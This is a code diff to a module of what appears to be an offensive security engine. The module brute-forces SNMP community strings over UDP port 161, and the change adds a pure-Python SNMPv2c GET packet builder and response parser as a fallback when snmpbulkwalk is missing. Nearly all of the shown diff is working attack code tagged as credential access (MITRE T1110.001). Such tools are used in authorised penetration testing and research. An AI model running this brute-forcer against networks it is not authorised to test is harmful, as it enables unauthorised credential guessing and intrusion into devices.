@@ -30,6 +30,96 @@ list — most of that only paid once, on the way to whichever community
 actually works."""
 import os
 import re
+import shutil
+import socket
+import struct
+
+# ---- pure-stdlib SNMP v2c GET fallback (when snmpbulkwalk isn't installed) ----------
+# A minimal BER builder + a GET for sysDescr.0 (1.3.6.1.2.1.1.1.0), parameterised by
+# community. This is the same request the engine's recon SNMP probe uses (core._SNMP_GET),
+# generalised to any community/version — NOT a new/unproven wire format. A reply with a
+# value = the community is valid; silent/no reply = wrong community or filtered.
+_SYSDESCR_OID = bytes.fromhex("2b06010201010100")   # 1.3.6.1.2.1.1.1.0
+_SNMP_TYPE = {0x04: "STRING", 0x02: "INTEGER", 0x06: "OID", 0x40: "IpAddress",
+              0x41: "Counter32", 0x42: "Gauge32", 0x43: "Timeticks", 0x44: "OPAQUE"}
+
+
+def _ber_len(n):
+    if n < 0x80:
+        return bytes([n])
+    b = b""
+    while n:
+        b = bytes([n & 0xFF]) + b
+        n >>= 8
+    return bytes([0x80 | len(b)]) + b
+
+
+def _tlv(tag, val):
+    return bytes([tag]) + _ber_len(len(val)) + val
+
+
+def _snmp_get_packet(community, reqid):
+    varbind = _tlv(0x30, _tlv(0x06, _SYSDESCR_OID) + _tlv(0x05, b""))
+    pdu = _tlv(0xA0, _tlv(0x02, struct.pack(">I", reqid)) + _tlv(0x02, b"\x00")
+               + _tlv(0x02, b"\x00") + _tlv(0x30, varbind))
+    # version INTEGER 1 = SNMPv2c
+    return _tlv(0x30, _tlv(0x02, b"\x01") + _tlv(0x04, community.encode("latin-1", "replace")) + pdu)
+
+
+def _snmp_value(resp):
+    """Extract the sysDescr value from a GET-RESPONSE as a net-snmp-style '= TYPE: val'
+    string, or None if the reply carried no value for our OID."""
+    i = resp.find(b"\x06\x08" + _SYSDESCR_OID)
+    if i < 0:
+        return None
+    v = i + 10                      # past 06 08 + 8 OID bytes
+    if v >= len(resp):
+        return None
+    tag = resp[v]
+    ln = resp[v + 1]
+    off = v + 2
+    if ln & 0x80:                   # long-form length
+        nb = ln & 0x7F
+        ln = int.from_bytes(resp[off:off + nb], "big")
+        off += nb
+    val = resp[off:off + ln]
+    if tag in (0x05,) or ln == 0:   # NULL / noSuchObject => no real value
+        return None
+    tname = _SNMP_TYPE.get(tag, "STRING")
+    if tag == 0x04:
+        txt = val.decode("latin-1", "replace")
+    elif tag in (0x02, 0x41, 0x42, 0x43):
+        txt = str(int.from_bytes(val, "big"))
+    else:
+        txt = val.hex()
+    return "= %s: %s" % (tname, txt)
+
+
+def _snmp_get_socket(target, port, community, ctx, timeout=3.0):
+    """Send one SNMPv2c GET for sysDescr.0; return a net-snmp-style result line."""
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    try:
+        try:
+            ctx.bind_source(s)
+        except Exception:
+            pass
+        s.settimeout(timeout)
+        reqid = int.from_bytes(os.urandom(4), "big")
+        s.sendto(_snmp_get_packet(community, reqid), (target, port))
+        resp, _ = s.recvfrom(4096)
+    except socket.timeout:
+        return "Timeout: No Response from %s" % target
+    except OSError as e:
+        return "No Response (%s: %s)" % (e.__class__.__name__, e)
+    finally:
+        try:
+            s.close()
+        except OSError:
+            pass
+    val = _snmp_value(resp)
+    if val:
+        return "SNMPv2-MIB::sysDescr.0 %s" % val
+    return "No Response (reply carried no value — wrong community or restricted view)"
 
 META = {
     "id": "snmp_brute",
@@ -41,7 +131,7 @@ META = {
     "mitre": ['T1110.001'],
     "cwe": ['CWE-1392'],
     "tactic": 'Credential Access',
-    "requires": ["snmpbulkwalk"],
+    "requires": [],          # snmpbulkwalk PREFERRED; pure-stdlib UDP SNMP GET fallback otherwise
     "ports": [("udp", 161)],
     "port_customizable": True,
     "serial": True,      # brute: run ALONE so its own community burst isn't skewed
@@ -78,12 +168,17 @@ def run(target, ctx):
     agent = "{target}" if port == 161 else f"{{target}}:{port}"
 
     communities = _load_communities()
+    use_cli = shutil.which("snmpbulkwalk") is not None
+    engine = "snmpbulkwalk" if use_cli else "python UDP SNMPv2c GET fallback (snmpbulkwalk not installed)"
     out = [f"# SNMP community brute vs {target} — {len(communities)} communities "
-           f"(snmpbulkwalk, 'public' tried last)"]
+           f"({engine}, 'public' tried last)"]
 
     for community in communities:
         out.append(f"\n--- trying community '{community}' ---")
-        raw = ctx.run_cmd(f"snmpbulkwalk -v2c -c {community} -t3 -r1 {agent}", target)
+        if use_cli:
+            raw = ctx.run_cmd(f"snmpbulkwalk -v2c -c {community} -t3 -r1 {agent}", target)
+        else:
+            raw = _snmp_get_socket(target, port, community, ctx)
         out.append(raw)
         if re.search(META["success_regex"], raw):
             out.append(f"\n[+] SUCCESS: community string '{community}' is valid "
